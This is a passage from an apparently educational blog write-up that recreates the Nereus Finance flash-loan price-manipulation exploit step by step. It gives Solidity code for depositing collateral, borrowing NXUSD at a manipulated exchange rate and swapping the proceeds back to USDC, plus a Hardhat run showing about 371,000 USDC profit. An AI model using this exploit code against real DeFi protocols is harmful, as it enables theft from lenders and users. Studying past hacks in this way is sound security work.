    usdc.<span style="color:rgb(245, 135, 31); font-weight:400;">balanceOf</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)),
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>,
    path,
    <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>),
    block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
  );
}</code></pre>

**Note: if you use the helper code in the `hardhat` test to give yourself 100 million USDC tokens, you need to change the first argument of `swapExactTokensForTokens` to `50460000e6`. This is because you will have over 149 million USDC tokens at this point, and you definitely don't want to swap that much USDC. Step 6 will fail if you do.**

### Step 5: Providing collateral to borrow NXUSD

Before we're able to borrow NXUSD, we need to provide our JLP tokens up as collateral.

This is actually quite a complicated step. The attacker communicates with two contracts during this (and the subsequent borrowing) step: a "CauldronV2" contract, and a "DegenBox" contract. [A high level overview of this contract setup can be found here](https://medium.datadriveninvestor.com/abracadabra-money-the-degenbox-guide-37d54fc4c4da). It looks like Nereus Finance forked these contracts off of an implementation by Abracadabra.money.

I'll attempt to explain how these contracts interact as best as possible:

- [CauldronV2](https://snowtrace.io/address/0xc0a7a7f141b6a5bce3ec1b81823c8afa456b6930) - This contract keeps track of the amount of tokens you borrow, and the amount of collateral you've provided.
- [DegenBox](https://snowtrace.io/address/0x0b1f9c2211f77ec3fa2719671c5646cf6e59b775) - This contract has the actual balance of the tokens (i.e the CauldronV2 contract does not have any NXUSD or JLP tokens in it, this one does). It also keeps track of how many tokens should be returned to you if you choose to call the `withdraw()` function in this contract. To withdraw any tokens from this contract in the first place, you have to go through the CauldronV2 contract and borrow it.

Remember in step 1 when we called this DegenBox contract's `setMasterContractApproval()` function to approve the `masterCauldron` to make decisions for our contract? Well, this is where it matters. The CauldronV2 contract mentioned above is the `cauldron` storage variable in the exploit script. This contract has a `masterContract` storage variable, which points to the `masterCauldron` in the exploit script.

If we make any calls into the `cauldron` contract, and it subsequently makes a call to the DegenBox contract on our behalf (For example, some form of an action that we can't take directly with the DegenBox contract), the DegenBox contract will check if the `cauldron` contract's `masterContract` is approved to make that call on our behalf. If it isn't, the transaction reverts.

**Note that this specific CauldronV2-DegenBox setup is used to provide USDC-WAVAX JLP tokens as collateral to borrow NXUSD. There are other CauldronV2-DegenBox setups that are used to provide other tokens as collateral as well.**

Anyways, in order to provide our JLP tokens as collateral, we can do this:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">function executeOperation(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> returns (bool) {
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 4: Provide all our WAVAX/USDC LP Tokens up as collateral</span>
  uint256 amountLP = wavaxusdc.balanceOf(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>));

  degenbox.deposit(IERC20(wavaxusdc), address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), amountLP, amountLP);
  cauldron.addCollateral(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), <span style="color:rgb(245, 135, 31); font-weight:400;">false</span>, amountLP);
}</code></pre>

We first deposit all of our JLP tokens into the DegenBox contract. This step transfers our tokens to the DegenBox contract, and the DegenBox keeps track of the fact that we have X amount of tokens stored in itself.

Then, we call `addCollateral()` on the `cauldron` contract. This function will call into the DegenBox contract and transfer the tokens that we provided to itself. Note that no tokens are actually transferred to the `cauldron` contract, the DegenBox simply modifies its state variables such that the `cauldron` contract's balance now matches our balance, and our balance is now set to 0.

If this step does not result in an integer underflow (which it would, if we hadn't deposited our tokens into the DegenBox contract first), then the transaction keeps proceeding. The `cauldron` contract will then track that we have provided this amount of JLP tokens as collateral.

### Step 6: Borrow NXUSD

Now, we borrow NXUSD. If you check the `cauldron` contract's `borrow()` function (which calls the `_borrow()` internal function), you'll see that it uses a `solvent` modifier. This modifier is defined as follows:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">modifier <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(66, 113, 174); font-weight:400;">solvent</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>)</span> {
    _;
    <span style="color:rgb(245, 135, 31); font-weight:400;">require</span>(_isSolvent(msg.sender, exchangeRate), <span style="color:rgb(113, 140, 0); font-weight:400;">&quot;Cauldron: user insolvent&quot;</span>);
}</code></pre>

Briefly explained, this modifier will run the function we called, and then use the current `exchangeRate` to determine whether the amount of NXUSD tokens we've borrowed is lower than the amount of collateral we provided by a certain amount. This is because a loan like this needs to be over-collateralized (i.e we need to provide more collateral than the equivalent amount of tokens we borrow). This modifier is used on the `borrow()` and `removeCollateral()` functions for obvious reasons.

Now, remember how we manipulated the exchange rate in step 4? Well, the `cauldron` contract doesn't fetch the new exchange rate automatically. We need to do that manually before borrowing the NXUSD tokens. Let's do that:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">bool</span>) </span>{
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 5: Update the exchangeRate that the cauldron sees when lending us</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// NXUSD for the collateral asset WAVAX/USDC Joe LP Pair</span>
  (bool updated, uint256 rate) = cauldron.updateExchangeRate();

  <span style="color:rgb(245, 135, 31); font-weight:400;">require</span>(updated, <span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;Exchange rate was not updated&#x27;</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 6: Borrow the 72% of the collateral amount. This seems to be the</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// sweet spot, 73% and above just fails</span>
  uint256 amountToBorrow = ((amountLP / rate) * <span style="color:rgb(245, 135, 31); font-weight:400;">1e18</span> * <span style="color:rgb(245, 135, 31); font-weight:400;">720</span>) / <span style="color:rgb(245, 135, 31); font-weight:400;">1000</span>;
  cauldron.borrow(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), amountToBorrow);
}</code></pre>

I figured out the 72% number through experimentation. Anything above this percentage was causing the transaction to revert due to the solvency check in the `solvent` modifier.

**Here's the interesting thing here: if you go back to step 3, we used 260,000 * 2 = 520,000 USDC to acquire this amount of JLP tokens. After the exchange rate is updated, this same amount of JLP tokens is now worth a little over $1.3m. You can calculate this value yourself by dividing the amount of LP tokens you provided as collateral by the exchange rate.**

Note that after this step, we still won't have access to our borrowed NXUSD. The `cauldron` contract will instead tell the DegenBox contract that we are able to now `withdraw()` X amount of NXUSD tokens from that contract (X being the amount we borrowed so long as the `borrow()` function didn't revert).

Let's actually get the tokens now:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">function executeOperation(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> returns (bool) {
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 7: Actually get our tokens. We borrowed them, but we need to</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// withdraw them now</span>
  uint256 borrowedBalance = degenbox.balanceOf(address(nxusd), address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>));
  degenbox.withdraw(nxusd, address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), borrowedBalance, borrowedBalance);
}</code></pre>

I highly suggest reading through the functions being called in this step as well as the previous step. They interact in an interesting way, and you'll learn a lot about how a protocol like this actually works in practice.

After this step, we have ~998,000 NXUSD. Assuming the 1:1 peg with USDC, we should have made a little over ~$400,000 in profit at this point. Of course, we won't be able to keep it all when we convert the NXUSD back to USDC, but that's ok, we only lose ~$29,000 in "fees" and keep ~$371,000 :D

### Step 7: Get our USDC tokens back

Now that we've basically gotten away with pure robbery, we want to swap all our WAVAX tokens for USDC tokens, so that we can actually repay our loan later on. This also has the added effect of undoing the price manipulation that we caused in step 4.

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span><span style="color:rgb(245, 135, 31); font-weight:400;">(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
)</span> <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> <span style="color:rgb(245, 135, 31); font-weight:400;">(<span style="color:rgb(137, 89, 168); font-weight:400;">bool</span>)</span> </span>{
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 8: Swap all of our WAVAX back for USDC, dropping the price down</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// to normal again</span>
  path[<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>] = <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(wavax);
  path[<span style="color:rgb(245, 135, 31); font-weight:400;">1</span>] = <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(usdc);
  router.<span style="color:rgb(245, 135, 31); font-weight:400;">swapExactTokensForTokens</span>(
    wavax.<span style="color:rgb(245, 135, 31); font-weight:400;">balanceOf</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)),
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>,
    path,
    <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>),
    block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
  );
}</code></pre>

This gives us back a bit over 50,400,000 USDC, which is not enough to repay the loan. The loan itself has a premium of 25,000 USDC, so we actually need to repay 51,025,000 USDC to satisfy the flash loan requirements.

We're fine though. If we assume that we'll get 998,000 USDC from the 998,000 NXUSD, then we'll have ~51,373,000 USDC left after repaying the flash loan.

### Step 8: Swapping the NXUSD tokens for USDC.e tokens

This step is also somewhat complex. It's not very easy to convert the NXUSD tokens to USDC. Remember that there are two NXUSD liquidity pools that we saw in the "Why would you ever borrow money in crypto?" section: NXUSD-3CRV and WXT-NXUSD. We can choose either liquidity pool to swap against. The attacker chose NXUSD-3CRV, so lets do that.

3CRV in this case stands for the av3CRV token, which is itself an LP token. The "av" stands for Avalanche, and the 3CRV stands for Dai, USDC, and USDT. The 3CRV token is part of the Curve protocol. 

**[More information about the Curve protocol can be found here](https://curve.readthedocs.io/). It'll be too much content to go through in this blog post (that's already really long).**

The attacker uses the [Curve "depositor" contract](https://snowtrace.io/address/0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e) to swap NXUSD for USDC.e through the NXUSD-3CRV meta pool. They do this by using the `exchange_underlying()` function in this contract. **Note that the contract is written in Vyper.**. We can do this as follows:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span><span style="color:rgb(245, 135, 31); font-weight:400;">(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
)</span> <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> <span style="color:rgb(245, 135, 31); font-weight:400;">(<span style="color:rgb(137, 89, 168); font-weight:400;">bool</span>)</span> </span>{
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Swap 9: Use the nxusd3crv pool to swap NXUSD for USDC.e</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Note that index 2 is avUSDC, but the function wraps it to USDC.e before</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// returning it to us</span>
  curvemeta.<span style="color:rgb(245, 135, 31); font-weight:400;">exchange_underlying</span>(
    nxusd3crv,
    <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>, <span style="color:rgb(142, 144, 140); font-weight:400;">// Within the NXUSD3Crv pool, the 0 index in the `coins` mapping is NXUSD</span>
    <span style="color:rgb(245, 135, 31); font-weight:400;">2</span>, <span style="color:rgb(142, 144, 140); font-weight:400;">// The index of the underlying output coin, which in this case is USDC.e</span>
    nxusd.<span style="color:rgb(245, 135, 31); font-weight:400;">balanceOf</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)),
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span> <span style="color:rgb(142, 144, 140); font-weight:400;">// Minimum amount to get back</span>
  );
}</code></pre>

The comments I put next to the arguments to this function may help decipher the actual function easier, but I highly recommend reading the corresponding function in the contract itself to see how it works.

After this step, all our NXUSD will have been converted to USDC.e.

### Step 9: Swap the USDC.e tokens for USDC tokens

The final step is to swap the USDC.e tokens we just acquired for USDC tokens. The attacker does this in two steps:

1. They swap ~80% of the USDC.e through the [Curve USDC.e-USDC StableSwap pool](https://snowtrace.io/address/0x3a43A5851A3e3E0e25A3c1089670269786be1577).
2. They swap the remaining USDC.e through the [Trader Joe Router](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4).

The reason they do this is because swapping all of the USDC.e for USDC using only one of the steps does not yield the best results. I'm not sure how the attacker came up with their numbers, but I just experimentally changed the percentage being swapped until I landed on my own 80.8%:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">function executeOperation(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> returns (bool) {
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Now, swap 80.8% of our USDC.e for USDC using the Curve.fi USDC.e - USDC</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Stable Swap pool, and the rest through the Trader Joe Router.</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">//</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Swapping 100% of the USDC.e through the pool, or 100% of the USDC.e</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// through the router yields a much lower result. I found 80.8% through the</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// stable swap pool to be the best ratio experimentally</span>
  uint256 optimalStableSwapPoolSwapAmount = ((usdce.balanceOf(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)) * <span style="color:rgb(245, 135, 31); font-weight:400;">808</span>) / <span style="color:rgb(245, 135, 31); font-weight:400;">1000</span>);
  usdceusdc.exchange(<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>, <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>, optimalStableSwapPoolSwapAmount, <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>);

  path[<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>] = address(usdce);
  path[<span style="color:rgb(245, 135, 31); font-weight:400;">1</span>] = address(usdc);

  router.swapExactTokensForTokens(
    usdce.balanceOf(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)),
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>,
    path,
    address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>),
    block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
  );

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Must return true, else the flash loan will revert</span>
  <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> <span style="color:rgb(245, 135, 31); font-weight:400;">true</span>;
}</code></pre>

After the `executeOperation()` function returns, we will have repaid our flash loan and ended up with a profit of ~371,000 USDC.

# Running the exploit

Finally, after all of that, we get to the end result:

```
$ npx hardhat test test/nereusfinance_attack/nereusfinance_attack.test.ts
Compiled 1 Solidity file successfully


  Nereus Finance Exploit
[+] USDC Balance before exploit: 0
[+] USDC Balance before exploit: 371559.498918
    ✔ Exploits successfully (699ms)


  1 passing (5s)

Done in 6.02s.
```

# Conclusion

And with that, the exploit is complete! We successfully used a flash loan to manipulate the price of a collateral token, before using it to borrow another token. We were able to freely undo the price manipulation, get most of our money back (we only lose out on the ~520,000 USDC worth of JLP tokens that we provided as collateral), along with ~371,000 USDC in profit from our loan.

**Remember, we never need to repay the loan. No one can force us to in a decentralized market. If the collateral we provided drops below the amount of NXUSD tokens we borrowed (which it will after we undo the price manipulation), liquidators will purchase our collateral at a discount to stabilize the market. You can read more about how this works online, but we'll never be required to pay back the NXUSD we borrowed.**

As always, [The full exploit, `hardhat` test, and my attack transaction analysis can be found here](https://github.com/farazsth98/real-world-ethereum-hacks-remastered).

- [Solidity Exploit](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/NereusFlashLoanAttack/NereusFlashLoanAttack.sol)
- [`Hardhat` test]()
- [Attack transaction analysis](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/NereusFlashLoanAttack/NereusFlashLoanAttack.md)

If you find any mistakes in this post, or have any questions related to it, please DM me on twitter (or if you can find me on discord, that works too)! I would love to answer any questions and gain any feedback at all.